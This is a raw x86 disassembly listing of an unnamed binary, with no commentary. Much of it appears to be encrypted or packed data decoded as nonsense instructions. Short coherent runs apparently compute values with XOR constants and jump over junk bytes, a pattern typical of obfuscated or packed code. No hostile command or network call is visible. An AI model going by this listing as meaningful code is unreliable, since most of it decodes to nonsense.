  40d365:	mov    edx,0x7268bf6
  40d36a:	pusha  
  40d36b:	sub    al,0xf8
  40d36d:	cli    
  40d36e:	das    
  40d36f:	and    al,0x5b
  40d371:	rol    DWORD PTR [edi-0x6f],0x7f
  40d375:	sub    bl,al
  40d377:	imul   edx,ebx,0x17e7af66
  40d37d:	dec    edi
  40d37e:	ss push cs
  40d380:	aad    0xbd
  40d382:	sub    ah,BYTE PTR [ecx-0x18fbd4db]
  40d388:	add    DWORD PTR [edi-0x1065c796],ecx
  40d38e:	mov    ah,0x2d
  40d390:	push   0x1ada6e5f
  40d395:	(bad)
  40d398:	inc    edx
  40d399:	dec    ebp
  40d39a:	out    dx,al
  40d39b:	mov    cl,0xca
  40d39d:	push   ebp
  40d39e:	test   esi,esi
  40d3a0:	icebp  
  40d3a1:	jmp    DWORD PTR [ebx+edx*2]
  40d3a4:	pop    edi
  40d3a5:	ss (bad) 
  40d3a8:	mov    esi,0xe9048c1e
  40d3ad:	mov    ebx,?
  40d3af:	pop    edi
  40d3b0:	cdq    
  40d3b1:	dec    eax
  40d3b2:	clc    
  40d3b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3b4:	lea    ebp,[edx]
  40d3b6:	add    dh,BYTE PTR [ebx-0x54d7cd87]
  40d3bc:	xchg   ecx,eax
  40d3bd:	ficom  DWORD PTR [ebx]
  40d3c0:	and    esp,ebp
  40d3c2:	rol    BYTE PTR [edi+0x4c],1
  40d3c5:	or     al,BYTE PTR [edi]
  40d3c7:	cmp    bl,bl
  40d3c9:	stos   DWORD PTR es:[edi],eax
  40d3ca:	xchg   edx,eax
  40d3cb:	pop    ds
  40d3cc:	or     al,0x4d
  40d3ce:	or     bl,ch
  40d3d0:	test   DWORD PTR [ecx+0x1a0cff2b],0xbd3a8e47
  40d3da:	in     eax,dx
  40d3db:	and    BYTE PTR [edx],bl
  40d3dd:	aas    
  40d3de:	jo     0x40d395
  40d3e0:	sti    
  40d3e1:	mov    esp,0x4aca4354
  40d3e6:	push   esi
  40d3e7:	pop    ebp
  40d3e8:	mov    ch,0x93
  40d3ea:	jecxz  0x40d3f0
  40d3ec:	sbb    BYTE PTR [eax-0x70800b9c],al
  40d3f2:	sbb    cl,BYTE PTR [ebp+0x12]
  40d3f5:	outs   dx,BYTE PTR ds:[esi]
  40d3f6:	dec    edx
  40d3f7:	ja     0x40d453
  40d3f9:	xchg   ecx,eax
  40d3fa:	retf   
  40d3fb:	add    BYTE PTR [edi+0x4b89a195],ah
  40d401:	adc    bl,ah
  40d403:	std    
  40d404:	xor    al,0xbf
  40d406:	adc    al,0xe3
  40d408:	mov    al,0x59
  40d40a:	xor    DWORD PTR [ecx],edx
  40d40c:	popa   
  40d40d:	lahf   
  40d40e:	add    DWORD PTR [ecx+0x33],edi
  40d411:	pop    ds
  40d412:	jmp    0x2035ea9b
  40d417:	inc    esp
  40d418:	cwde   
  40d419:	popf   
  40d41a:	shr    BYTE PTR [ebx+edx*4+0x30],cl
  40d41e:	jle    0x40d44c
  40d420:	jbe    0x40d424
  40d422:	mov    edi,DWORD PTR [esi-0x47]
  40d425:	ds sub bh,al
  40d428:	retf   0xca77
  40d42b:	mov    esp,edx
  40d42d:	es xchg ah,al
  40d430:	mov    edi,DWORD PTR [edi-0x40f9b25]
  40d436:	sbb    dh,ch
  40d438:	scas   al,BYTE PTR es:[edi]
  40d439:	inc    eax
  40d43a:	nop
  40d43b:	outs   dx,BYTE PTR ds:[esi]
  40d43c:	loop   0x40d47c
  40d43e:	bound  ebp,QWORD PTR [edx+0x56b87f53]
  40d444:	cmp    ebp,DWORD PTR [ebx-0x5]
  40d447:	jl     0x40d424
  40d449:	dec    edi
  40d44a:	pop    ss
  40d44b:	xor    eax,0x6a4e8394
  40d450:	jo     0x40d3f2
  40d452:	mov    ebx,0x8ed59287
  40d457:	sbb    eax,0x93d56c9b
  40d45c:	mov    ebp,0xfde4ab20
  40d461:	push   ss
  40d462:	sub    eax,0xf8807c78
  40d467:	adc    al,0xb
  40d469:	push   eax
  40d46a:	ins    DWORD PTR es:[edi],dx
  40d46b:	inc    esp
  40d46c:	mov    dh,BYTE PTR [ecx+edx*1-0x5157f46e]
  40d473:	addr16 loope 0x40d437
  40d476:	bound  ecx,QWORD PTR ds:0x219eaecd
  40d47c:	mov    ah,0x2c
  40d47e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d47f:	xchg   ebp,eax
  40d480:	xor    cl,BYTE PTR [esi+0x2ec853a2]
  40d486:	xchg   DWORD PTR [ecx+esi*8+0x69],ebx
  40d48a:	push   ecx
  40d48b:	jl     0x40d45b
  40d48d:	ds jmp 0x40d4a1
  40d490:	mov    cl,0xca
  40d492:	add    esp,ebp
  40d494:	mov    ah,0x89
  40d496:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d497:	data16 ror BYTE PTR ds:[edx-0xc9b4c2e],0xd3
  40d4a0:	fisubr WORD PTR [ebp+0x72]
  40d4a3:	push   ebx
  40d4a4:	dec    esi
  40d4a5:	adc    DWORD PTR ds:[ecx],0x38e4762a
  40d4ac:	or     eax,0x9a85d7d1
  40d4b1:	lds    edi,FWORD PTR [eax]
  40d4b3:	and    eax,0xcc35eae2
  40d4b8:	dec    ebp
  40d4b9:	dec    ecx
  40d4ba:	xchg   edx,eax
  40d4bb:	outs   dx,BYTE PTR ds:[esi]
  40d4bc:	mov    WORD PTR [edx+0x66],es
  40d4bf:	xchg   BYTE PTR [ebx+0x24],al
  40d4c2:	(bad)  
  40d4c3:	shr    DWORD PTR [ebp-0x52fb4e89],cl
  40d4c9:	xchg   edi,eax
  40d4ca:	jo     0x40d4ec
  40d4cc:	std    
  40d4cd:	cmp    BYTE PTR [edx],dh
  40d4cf:	aad    0x4d
  40d4d1:	dec    ecx
  40d4d2:	daa    
  40d4d3:	jbe    0x40d4e5
  40d4d5:	popa   
  40d4d6:	ficomp DWORD PTR [edi]
  40d4d8:	mov    ebx,0xd70528be
  40d4dd:	shl    dh,cl
  40d4df:	xor    al,0x9
  40d4e1:	jnp    0x40d4f1
  40d4e3:	jg     0x40d4f1
  40d4e5:	addr16 ss fwait
  40d4e8:	rol    DWORD PTR [ecx+0x5cb203d4],1
  40d4ee:	hlt    
  40d4ef:	xlat   BYTE PTR ds:[ebx]
  40d4f0:	pop    ecx
  40d4f1:	dec    edi
  40d4f2:	sub    al,BYTE PTR [ecx-0x75]
  40d4f5:	push   ss
  40d4f6:	pop    ebx
  40d4f7:	mov    WORD PTR [edx],cs
  40d4f9:	inc    edi
  40d4fa:	inc    ebp
  40d4fb:	(bad)  
  40d4fc:	fst    st(7)
  40d4fe:	aas    
  40d4ff:	gs js  0x40d55c
  40d502:	mov    DWORD PTR [ebx-0x3],ebp
  40d505:	jmp    0xfe025bc3
  40d50a:	mov    ebp,0xeeb8c842
  40d50f:	jo     0x40d578
  40d511:	xchg   esp,eax
  40d512:	iret   
  40d513:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d514:	or     al,0x65
  40d516:	in     eax,0x10
  40d518:	(bad)  
  40d519:	mov    ds:0xeadb1f3f,al
  40d51e:	cmp    BYTE PTR [eax-0x5c855a78],al
  40d524:	rol    DWORD PTR [ebp-0x43],1
  40d527:	push   es
  40d528:	inc    ebx
  40d529:	dec    esi
  40d52a:	mov    dh,0x3d
  40d52c:	dec    edx
  40d52d:	xchg   edi,eax
  40d52e:	adc    BYTE PTR [edi-0x657f52c7],0x3c
  40d535:	mov    WORD PTR [ecx-0x7b8f11a7],ss
  40d53b:	push   0xffffffd5
  40d53d:	fist   DWORD PTR [edx-0x7b6eba2a]
  40d543:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d544:	add    BYTE PTR [edx-0x6c530aa7],0x88
  40d54b:	push   ebp
  40d54c:	mov    bl,0x8a
  40d54e:	in     eax,0x26
  40d550:	in     eax,dx
  40d551:	mov    ds:0x634a5c73,eax
  40d556:	pop    esp
  40d557:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d558:	jae    0x40d538
  40d55a:	ss aaa 
  40d55c:	dec    eax
  40d55d:	pop    ecx
  40d55e:	inc    ebp
  40d55f:	sub    BYTE PTR [esi+ebx*8+0x11158ba4],dl
  40d566:	and    BYTE PTR [edi],0x3f
  40d569:	jg     0x40d552
  40d56b:	cmp    BYTE PTR [eax+0x71f858e7],cl
  40d571:	mov    esi,0xc2310bee
  40d576:	pslld  mm7,QWORD PTR [ebp-0xc5b56e6]
  40d57d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d57e:	pop    ds
  40d57f:	xor    al,0xa8
  40d581:	ror    DWORD PTR [ecx-0x3b],1
  40d584:	icebp  
  40d585:	iret   
  40d586:	iret   
  40d587:	sbb    al,0xff
  40d589:	adc    al,0x5c
  40d58b:	rol    BYTE PTR [edx+0x776d9602],cl
  40d591:	jmp    0x4cd032fe
  40d596:	out    dx,eax
  40d597:	std    
  40d598:	add    esi,DWORD PTR [esi+0x529e77f9]
  40d59e:	cmp    al,0xa0
  40d5a0:	(bad)  
  40d5a1:	test   DWORD PTR ss:[eax+0x76],esp
  40d5a5:	ja     0x40d5e2
  40d5a7:	or     cl,BYTE PTR [esi+0x4aaca7ce]
  40d5ad:	(bad)  
  40d5af:	out    dx,eax
  40d5b0:	mov    ds:0x3c21c364,al
  40d5b5:	mov    bh,0x8e
  40d5b7:	retf   0xaa3d
  40d5ba:	cld    
  40d5bb:	neg    BYTE PTR [ebx-0x4f]
  40d5be:	repz pop eax
  40d5c0:	and    eax,0x2f49535a
  40d5c5:	push   ecx
  40d5c6:	fcmovnb st,st(1)
  40d5c8:	daa    
  40d5c9:	inc    ebx
  40d5ca:	jge    0x40d646
  40d5cc:	in     al,0xf0
  40d5ce:	dec    esp
  40d5cf:	pop    edx
  40d5d0:	cdq    
  40d5d1:	(bad)  
  40d5d2:	popf   
  40d5d3:	fucomp st(1)
  40d5d5:	clc    
  40d5d6:	cdq    
  40d5d7:	js     0x40d5f6
  40d5d9:	and    DWORD PTR [eax-0x47],edx
  40d5dc:	push   edi
  40d5dd:	jmp    0x2efe5c6
  40d5e2:	mov    edx,DWORD PTR [ebp-0x4]
  40d5e5:	xor    edx,ecx
  40d5e7:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5ea:	lea    ecx,[edx+ecx*1+0x32729b]
  40d5f1:	cmp    ecx,eax
  40d5f3:	je     0x40dfca
  40d5f9:	mov    edi,DWORD PTR [ebp-0x18]
  40d5fc:	mov    eax,DWORD PTR [ebp+0x8]
  40d5ff:	mov    edx,DWORD PTR [ebp+0x14]
  40d602:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d606:	mov    ecx,0x7510854
  40d60b:	xor    edx,edx
  40d60d:	xor    edi,ecx
  40d60f:	mov    esi,0x32729b
  40d614:	add    edi,esi
  40d616:	div    edi
  40d618:	mov    edx,DWORD PTR [ebp-0x4]
  40d61b:	jmp    0x40d93b
  40d620:	inc    ecx
  40d621:	stos   BYTE PTR es:[edi],al
  40d622:	push   ss
  40d623:	jmp    0x40d61a
  40d625:	jae    0x40d688
  40d627:	mov    al,0xbf
  40d629:	jo     0x40d5c5
  40d62b:	jecxz  0x40d5f6
  40d62d:	in     eax,0xa3
  40d62f:	xlat   BYTE PTR ds:[ebx]
  40d630:	sub    edx,DWORD PTR [eax+0x7d7d7e7e]
  40d636:	jle    0x40d6b6
  40d638:	rcr    al,0xf2
  40d63b:	cmp    BYTE PTR [edi+0x7d9e4586],al
  40d641:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d643:	pop    ecx
  40d644:	mov    bl,0xec
  40d646:	inc    esp
  40d647:	(bad)  
  40d648:	xor    edx,DWORD PTR [ebx]
  40d64a:	cmp    BYTE PTR [ecx],cl
  40d64c:	and    eax,0x3c10923b
  40d651:	pop    edx
  40d652:	(bad)  
  40d653:	out    0x1c,al
  40d655:	mov    ah,0x37
  40d657:	push   eax
  40d658:	pop    ds
  40d659:	sub    ebx,DWORD PTR [eax-0x70]
  40d65c:	(bad)  
  40d65d:	test   eax,0xb43917f3
  40d662:	and    al,0x18
  40d664:	jnp    0x40d6c3
  40d666:	jo     0x40d5f3
  40d668:	rol    ecx,0xb0
  40d66b:	into   
  40d66c:	retf   0x35d6
  40d66f:	push   0x634e76c
  40d674:	xor    al,0x92
  40d676:	or     ch,BYTE PTR [ecx]
  40d678:	aam    0x92
  40d67a:	aad    0x37
  40d67c:	inc    ecx
  40d67d:	into   
  40d67e:	daa    
  40d67f:	mov    cl,0xe0
  40d681:	dec    esp
  40d682:	sar    DWORD PTR [esi+0x18],cl
  40d685:	push   ds
  40d686:	aaa    
  40d687:	jmp    0x40d66b
  40d689:	pop    esp
  40d68a:	adc    ebp,0xda2a367
  40d690:	pop    esp
  40d691:	mov    ecx,0xd128004d
  40d696:	int3   
  40d697:	lahf   
  40d698:	cmp    dl,BYTE PTR [edi]
  40d69a:	mov    ecx,0x2c1965b0
  40d69f:	test   esi,edi
  40d6a1:	icebp  
  40d6a2:	mov    ch,0xc0
  40d6a4:	das    
  40d6a5:	shl    BYTE PTR [edi+0x29e41ab3],cl
  40d6ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6ac:	adc    edi,edi
  40d6ae:	cmp    DWORD PTR [edx],0xa4fb600d
  40d6b4:	icebp  
  40d6b5:	inc    edi
  40d6b6:	imul   edi,DWORD PTR ds:0xfa86be6b,0x63a30bf9
  40d6c0:	inc    ebp
  40d6c1:	mov    esp,0x46a404c4
  40d6c6:	push   0xffffffcf
  40d6c8:	add    BYTE PTR [ebx-0x12],0xbf
  40d6cc:	pusha  
  40d6cd:	inc    ecx
  40d6ce:	pop    ecx
  40d6cf:	lds    ebx,FWORD PTR [ecx]
  40d6d1:	cmp    ecx,esi
  40d6d3:	std    
  40d6d4:	das    
  40d6d5:	test   DWORD PTR [edx-0x76687a78],0xa981040c
  40d6df:	mov    ecx,gs
  40d6e1:	dec    edx
  40d6e2:	xor    DWORD PTR [ebp+0x7e8ba3],esp
  40d6e8:	aad    0x4a
  40d6ea:	sub    BYTE PTR [ebx],bh
  40d6ec:	mov    BYTE PTR [ebx+0x57],ah
  40d6ef:	stos   BYTE PTR es:[edi],al
  40d6f0:	add    BYTE PTR ds:0xe2ad3554,0x62
  40d6f7:	mov    BYTE PTR [edi-0x1f],dl
  40d6fa:	in     al,dx
  40d6fb:	inc    esi
  40d6fc:	xchg   ebx,eax
  40d6fd:	pop    eax
  40d6fe:	(bad)  
  40d6ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d700:	lods   eax,DWORD PTR ds:[esi]
  40d701:	rcr    BYTE PTR [edx+0x41ad31e4],0xea
  40d708:	in     al,dx
  40d709:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d70a:	xchg   esi,eax
  40d70b:	pusha  
  40d70c:	cdq    
  40d70d:	inc    ebx
  40d70e:	pop    ds
  40d70f:	jns    0x40d73b
  40d711:	sub    al,0xfd
  40d713:	xchg   esp,eax
  40d714:	mov    ebp,0xa32549f4
  40d719:	lea    eax,[edx-0x732273da]
  40d71f:	(bad)  
  40d720:	mov    al,ds:0xb03c3407
  40d725:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d726:	add    al,0xf5
  40d728:	cmc    
  40d729:	lods   al,BYTE PTR ds:[esi]
  40d72a:	push   edi
  40d72b:	xchg   esi,eax
  40d72c:	idiv   eax
  40d72e:	fsub   DWORD PTR [edi]
  40d730:	sar    esp,0xff
  40d733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d734:	je     0x40d753
  40d736:	inc    ecx
  40d737:	jbe    0x40d783
  40d739:	clc    
  40d73a:	mov    WORD PTR [esi],ds
  40d73c:	or     al,0x4e
  40d73e:	dec    edi
  40d73f:	sub    al,0xde
  40d742:	daa    
  40d743:	ret    0x989
  40d746:	sub    BYTE PTR [edi+0x2a],bh
  40d749:	das    
  40d74a:	mov    dh,0xc2
  40d74c:	jns    0x40d76a
  40d74e:	dec    esp
  40d74f:	rcr    BYTE PTR [ebx-0x9],0xc8
  40d753:	retf   0x91fc
  40d756:	push   ebx
  40d757:	popa   
  40d758:	call   0xc0cd:0xcf49fa87
  40d75f:	fld    TBYTE PTR [eax]
  40d761:	loop   0x40d7cb
  40d763:	out    dx,eax
  40d764:	int3   
  40d765:	mov    ds:0xc39b9c57,al
  40d76a:	mov    al,0x9c
  40d76c:	and    dl,bh
  40d76e:	and    eax,0x9c6268d4
  40d773:	in     al,0x96
  40d775:	xchg   BYTE PTR [ebx+0xae44fb6],ch
  40d77b:	lock xor eax,0x9622a27a
  40d781:	dec    esi
  40d782:	mov    ebx,0x5919f9e0
  40d787:	mov    esi,0x9c2000ad
  40d78c:	mov    ebx,0xdcf339
  40d791:	pop    ecx
  40d792:	rol    BYTE PTR [ebp+0x12],0x3a
  40d796:	fild   WORD PTR [eax+0x1370a2e6]
  40d79c:	jmp    0x2c2c:0xfb99ee7d
  40d7a3:	adc    al,0x7e
  40d7a5:	sbb    al,BYTE PTR [ebp+0x4]
  40d7a8:	push   es
  40d7a9:	jecxz  0x40d7cc
  40d7ab:	sbb    al,0x2d
  40d7ad:	and    BYTE PTR [eax+esi*8],dl
  40d7b0:	xchg   BYTE PTR [ebx],ah
  40d7b2:	fistp  QWORD PTR [eax-0x3c]
  40d7b5:	or     esp,DWORD PTR [ecx+0x41]
  40d7b8:	ins    BYTE PTR es:[edi],dx
  40d7b9:	xor    bh,BYTE PTR [edi+eax*2+0x6aad4ec9]
  40d7c0:	xchg   DWORD PTR [ebx+0x61],esi
  40d7c3:	(bad)  
  40d7c4:	packssdw mm0,QWORD PTR [edx+0x675fc82a]
  40d7cb:	retf   0x9da1
  40d7ce:	xor    eax,0x6d844377
  40d7d3:	xor    al,0xdd
  40d7d5:	inc    ebx
  40d7d6:	stos   BYTE PTR es:[edi],al
  40d7d7:	(bad)  [esp+eax*8+0xd]
  40d7db:	fidiv  WORD PTR [ecx+0x3d]
  40d7de:	ror    DWORD PTR [edx+eiz*4-0x6e9340c1],1
  40d7e5:	jnp    0x40d83a
  40d7e7:	mov    eax,ds:0x8db5d457
  40d7ec:	js     0x40d7cb
  40d7ee:	push   0x29
  40d7f0:	popf   
  40d7f1:	xor    al,0xfd
  40d7f3:	add    al,0xea
  40d7f5:	mov    bh,0x9e
  40d7f7:	xchg   edx,eax
  40d7f8:	js     0x40d7bc
  40d7fa:	repnz mov bl,0xf3
  40d7fd:	shl    DWORD PTR [esi],0xdf
  40d800:	rcr    eax,0xb8
  40d803:	push   ds
  40d804:	jo     0x40d855
  40d806:	inc    ebp
  40d807:	adc    BYTE PTR [edx],ch
  40d809:	in     al,0x57
  40d80b:	add    edi,esi
  40d80d:	dec    edx
  40d80e:	nop
  40d80f:	sbb    eax,0x9e33e4d2
  40d814:	call   0x4463bdd3
  40d819:	in     eax,0x12
  40d81b:	in     al,dx
  40d81c:	pop    ebx
  40d81d:	push   cs
  40d81e:	nop
  40d81f:	xor    DWORD PTR [esi-0x5f9b3154],0xffffffa4
  40d826:	repnz sbb DWORD PTR [ebp+0x51],esp
  40d82a:	sbb    esp,DWORD PTR [esp+eiz*2]
  40d82d:	sub    al,0x70
  40d82f:	dec    edx
  40d830:	aas    
  40d831:	inc    edi
  40d832:	scas   al,BYTE PTR es:[edi]
  40d833:	mov    al,dh
  40d835:	push   esp
  40d836:	pop    edx
  40d837:	or     ebp,edx
  40d839:	lds    eax,FWORD PTR fs:[edi+0x3490e23f]
  40d840:	inc    esi
  40d841:	jmp    0xec2:0x2474d68d
  40d848:	aam    0xc1
  40d84a:	into   
  40d84b:	xchg   edi,eax
  40d84c:	pcmpgtw mm1,QWORD PTR [ebp+0x47]
  40d850:	mov    edi,0x75063312
  40d855:	int3   
  40d856:	pop    ds
  40d857:	lahf   
  40d858:	hlt    
  40d859:	adc    eax,0xe6e9ea5
  40d85e:	lea    esi,[edi]
  40d860:	jb     0x40d8a6
  40d862:	jmp    0x1d24f1cd
  40d867:	lods   eax,DWORD PTR ds:[esi]
  40d868:	inc    ebp
  40d869:	cmp    cl,BYTE PTR [esi]
  40d86b:	not    DWORD PTR [eax+edi*4+0x58]
  40d86f:	icebp  
  40d870:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d871:	pusha  
  40d872:	lea    esi,[edx+0x4cd2ad76]
  40d878:	dec    edi
  40d879:	imul   ebx,DWORD PTR ds:0xa07605fd,0xa8d76bee
  40d883:	shl    BYTE PTR [ecx+eax*1],1
  40d886:	hlt    
  40d887:	or     eax,0x316865b5
  40d88c:	jmp    0xfe4a:0xf7540de4
  40d893:	popa   
  40d894:	int3   
  40d895:	cmp    eax,DWORD PTR [edi]
  40d897:	adc    dh,cl
  40d899:	fbld   TBYTE PTR [esi-0x65]
  40d89c:	mov    ds:0x103e8626,al
  40d8a1:	popa   
  40d8a2:	dec    edx
  40d8a3:	push   0x3be93562
  40d8a8:	cmp    BYTE PTR [ecx+0x2],ch
  40d8ab:	xchg   BYTE PTR ds:0xe84c3d66,cl
  40d8b1:	adc    eax,0x9cfe485e
  40d8b6:	cmp    BYTE PTR [ebp+0x604abff5],cl
  40d8bc:	dec    ecx
  40d8bd:	scas   al,BYTE PTR es:[edi]
  40d8be:	hlt    
  40d8bf:	push   edi
  40d8c0:	add    al,0x45
  40d8c2:	ins    DWORD PTR es:[edi],dx
  40d8c3:	ins    BYTE PTR es:[edi],dx
  40d8c4:	jl     0x40d8a4
  40d8c6:	pop    ebx
  40d8c7:	inc    esp
  40d8c8:	mov    ecx,0x5eb3e1c9
  40d8cd:	idiv   BYTE PTR [esi-0x71]
  40d8d0:	cmp    BYTE PTR [ebp+0x4f],dh
  40d8d3:	fmul   st,st(3)
  40d8d5:	mov    ch,BYTE PTR [ecx+0x1e]
  40d8d8:	push   ecx
  40d8d9:	imul   cl
  40d8db:	bound  edi,QWORD PTR ds:0xa54a4d00
  40d8e1:	out    0x91,al
  40d8e3:	jecxz  0x40d95a
  40d8e5:	fadd   st(0),st
  40d8e7:	daa    
  40d8e8:	mov    DWORD PTR [ebx*4+0x198eb1d5],esi
  40d8ef:	sbb    DWORD PTR [ebp-0x546680ac],eax
  40d8f5:	fst    DWORD PTR [ebx-0x6c]
  40d8f8:	mov    DWORD PTR [ebx-0x466e036f],0x4c8af730
  40d902:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d903:	aad    0xd1
  40d905:	mov    bl,0xca
  40d907:	ins    DWORD PTR es:[edi],dx
  40d908:	das    
  40d909:	xlat   BYTE PTR ds:[ebx]
  40d90a:	gs jns 0x40d91f
  40d90d:	shl    BYTE PTR [ebp+0x6435e8b6],cl
  40d913:	stos   BYTE PTR es:[edi],al
  40d914:	or     esp,ebp
  40d916:	mov    ds:0xfb773aab,al
  40d91b:	jg     0x40d94c
  40d91d:	adc    BYTE PTR [eax],al
  40d91f:	mov    esi,0x770a972c
  40d924:	mov    ah,0xa3
  40d926:	sub    BYTE PTR cs:[edi+0x349e9dc9],bl
  40d92d:	scas   al,BYTE PTR es:[edi]
  40d92e:	xor    esi,DWORD PTR [esi+eiz*8+0x3a014427]
  40d935:	hlt    
  40d936:	out    dx,al
  40d937:	aas    
  40d938:	and    edi,DWORD PTR [edi+0x2c]
  40d93b:	xor    edx,ecx
  40d93d:	lea    eax,[edx+eax*1+0x32729b]
  40d944:	jmp    0x40dc64
  40d949:	das    
  40d94a:	sub    BYTE PTR [ecx],0x25
  40d94d:	mov    cl,0xb5
  40d94f:	xor    edx,DWORD PTR [eax-0x2c802913]
  40d955:	sub    ebp,eax
  40d957:	adc    al,0x66
  40d959:	ss lahf 
  40d95b:	jle    0x40d9db
  40d95d:	jge    0x40d9dc
  40d95f:	jle    0x40d9df
  40d961:	imul   edx,DWORD PTR [edi],0xffffff82
  40d964:	push   ss
  40d965:	mov    WORD PTR [esi-0x4ba4747f],?
  40d96b:	test   DWORD PTR [ecx+ebp*2+0x75],ecx
  40d96f:	xor    dl,BYTE PTR [ecx+0x1b84b67c]
  40d975:	inc    edi
  40d976:	in     al,0x2e
  40d978:	pop    esp
  40d979:	fnstcw WORD PTR [edx+0x496b449b]
  40d97f:	mov    bh,ah
  40d981:	sbb    BYTE PTR [ebx+0x13],bh
  40d984:	lea    ebx,[ebx-0x1abaf716]
  40d98a:	hlt    
  40d98b:	not    bh
  40d98d:	cli    
  40d98e:	adc    eax,0x6bc11894
  40d993:	call   0x23797cce
  40d998:	xor    dl,ch
  40d99a:	xor    al,0xfb
  40d99c:	jecxz  0x40d9bb
  40d99e:	pop    ebp
  40d99f:	test   DWORD PTR [edx-0x4947a9aa],0x40951c94
  40d9a9:	in     al,0x7d
  40d9ab:	pop    esp
  40d9ac:	aad    0x22
  40d9ae:	inc    eax
  40d9af:	fild   WORD PTR [ebx+0x99f7f17]
  40d9b5:	xchg   ebx,eax
  40d9b6:	sbb    DWORD PTR [ebx-0x7b438a04],esi
  40d9bc:	cmp    BYTE PTR [esi],0xa3
  40d9bf:	sbb    BYTE PTR [edx],0x64
  40d9c2:	shl    ah,1
  40d9c4:	in     al,0xa8
  40d9c6:	fist   DWORD PTR [esi]
  40d9c8:	jp     0x40da3d
  40d9ca:	ret    
  40d9cb:	leave  
  40d9cc:	mov    ecx,edi
  40d9ce:	cmp    al,0xc7
  40d9d0:	jmp    0x46250ed7
  40d9d5:	dec    edx
  40d9d6:	push   eax
  40d9d7:	fs test eax,0x46aadc17
  40d9dd:	mov    ebp,0x8ae16ff0
  40d9e2:	test   DWORD PTR [ecx-0x50],0xa1e87f96
  40d9e9:	pop    ecx
  40d9ea:	shl    ebp,1
  40d9ec:	push   ebx
  40d9ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9ee:	cmc    
  40d9ef:	rdpmc  
  40d9f1:	and    al,0x8a
  40d9f3:	xchg   esp,eax
  40d9f4:	push   0xffffff93
  40d9f6:	iret   
  40d9f7:	mov    bl,0x15
  40d9f9:	push   ds
  40d9fa:	mov    edi,0x913ecbe1
  40d9ff:	push   eax
  40da00:	or     dh,BYTE PTR [edi]
  40da02:	daa    
  40da03:	push   0x2b
  40da05:	add    cl,dl
  40da07:	hlt    
  40da08:	out    0x1c,al
  40da0a:	scas   eax,DWORD PTR es:[edi]
  40da0b:	fsub   QWORD PTR [esi+eax*1]
  40da0e:	in     al,dx
  40da0f:	jmp    0x574b:0x334868eb
  40da16:	xchg   esp,eax
  40da17:	jle    0x40d9a0
  40da19:	xchg   ebp,eax
  40da1a:	out    0xce,eax
  40da1c:	icebp  
  40da1d:	adc    ch,bl
  40da1f:	inc    ebx
  40da20:	push   cs
  40da21:	(bad)  [ecx]
  40da23:	and    esp,DWORD PTR [eax-0x20]
  40da26:	mov    eax,0xa61b9fb4
  40da2b:	adc    DWORD PTR [edi-0x3],edx
  40da2e:	int    0x2e
  40da30:	mov    eax,fs
  40da32:	mov    fs,WORD PTR [ecx+0x57]
  40da35:	iret   
  40da36:	sub    eax,0x7153055
  40da3b:	mov    BYTE PTR [eax],0x2e
  40da3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da3f:	scas   eax,DWORD PTR es:[edi]
  40da40:	mov    bl,0xe9
  40da42:	push   ebp
  40da43:	data16 out 0x36,al
  40da46:	dec    ebx
  40da47:	dec    ebx
  40da48:	mov    edx,0x9d746491
  40da4d:	sbb    eax,0xbb170447
  40da52:	or     dl,BYTE PTR [ebx+0x49]
  40da55:	pop    ebx
  40da56:	jnp    0x40d9e1
  40da58:	and    al,0xd5
  40da5a:	or     edi,0xffffff87
  40da5d:	sub    esi,esp
  40da5f:	ss jns 0x40da0b
  40da62:	and    DWORD PTR [ebx+edi*1+0x1d],esi
  40da66:	dec    ecx
  40da67:	sub    DWORD PTR [eax+0x65],ecx
  40da6a:	pusha  
  40da6b:	sub    bl,BYTE PTR [ebp-0x3a051e67]
  40da71:	pushf  
  40da72:	pop    DWORD PTR [ebp-0x18]
  40da75:	ja     0x40dabd
  40da77:	jle    0x40da03
  40da79:	mov    al,0xa9
  40da7b:	pop    ecx
  40da7c:	cmp    eax,0xd82ab577
  40da81:	mov    ah,0xbc
  40da83:	lock fiadd WORD PTR [edi+0x558ec387]
  40da8a:	mov    bl,0xa7
  40da8c:	in     eax,dx
  40da8d:	or     BYTE PTR [eax],dh
  40da8f:	and    ch,bl
  40da91:	repnz fwait
  40da93:	icebp  
  40da94:	and    al,BYTE PTR [eax]
  40da96:	imul   ecx,edx,0x10abe863
  40da9c:	aaa    
  40da9d:	test   DWORD PTR [ebp-0x5e],eax
  40daa0:	iret   
  40daa1:	push   es
  40daa2:	inc    edi
  40daa3:	pushf  
  40daa4:	push   ecx
  40daa5:	dec    ebp
  40daa6:	outs   dx,DWORD PTR ds:[esi]
  40daa7:	pop    edi
  40daa8:	in     eax,dx
  40daa9:	out    0x13,al
  40daab:	and    eax,0xa89d0ae0
  40dab0:	inc    eax
  40dab1:	std    
  40dab2:	je     0x40da45
  40dab4:	call   0xdf51eca7
  40dab9:	fucomp st(2)
  40dabb:	cdq    
  40dabc:	jmp    0x873:0x4dd03aec
  40dac3:	js     0x40da68
  40dac5:	push   esi
  40dac6:	ror    eax,cl
  40dac8:	and    eax,0x6ec8ba6a
  40dacd:	bound  eax,QWORD PTR [edi]
  40dacf:	cmc    
  40dad0:	dec    ebx
  40dad1:	outs   dx,DWORD PTR ds:[esi]
  40dad2:	stos   DWORD PTR es:[edi],eax
  40dad3:	test   BYTE PTR [edx-0x80],bl
  40dad6:	mov    ds:0x3b454248,al
